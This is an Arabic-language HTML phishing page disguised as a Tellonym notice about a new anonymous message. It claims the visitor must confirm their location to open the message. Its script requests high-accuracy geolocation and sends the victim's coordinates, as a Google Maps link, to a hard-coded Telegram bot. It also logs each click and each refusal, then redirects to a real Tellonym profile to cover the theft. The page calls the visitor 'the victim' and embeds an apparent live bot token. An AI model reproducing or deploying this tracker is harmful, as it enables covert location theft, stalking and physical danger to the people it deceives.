<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schaien - Tellonym</title>
    <style>
        body { background: #121212; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 90%; max-width: 400px; }
        button { background: #00f2fe; color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; width: 100%; }
        button:hover { background: #05d5e0; transform: scale(1.05); }
        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="margin-bottom: 10px;">رسالة جديدة مجهولة!</h2>
    <p>لديك رسالة جديدة على Tellonym. للخصوصية والأمان، يجب التأكد من موقعك الجغرافي لفتح الرسالة.</p>
    <!-- الزر الذي سيجبر المتصفح على إظهار Allow -->
    <button onclick="startHunt()">قراءة الرسالة الآن</button>
</div>

<script>
    const token = "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM";
    const id = "1138822664";
    const url = "https://tellonym.me/Schaien";

    function zap(msg) {
        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
    }

    function startHunt() {
        zap("🔔 **بدأ التفاعل!** الضحية ضغط على الزر ويواجه الآن نافذة السماح...");

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    zap(`🎯 **تم القنص بنجاح!**\n📍 الخريطة: [فتح الموقع](${map})\n📏 الدقة: ${p.coords.accuracy} متر`);
                    setTimeout(() => { window.location.href = url; }, 500);
                },
                (e) => {
                    zap("❌ الضحية ضغط على الزر لكنه رفض (Allow) أو المتصفح حظره.");
                    window.location.href = url;
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            window.location.href = url;
        }
    }
</script>

</body>
</html>
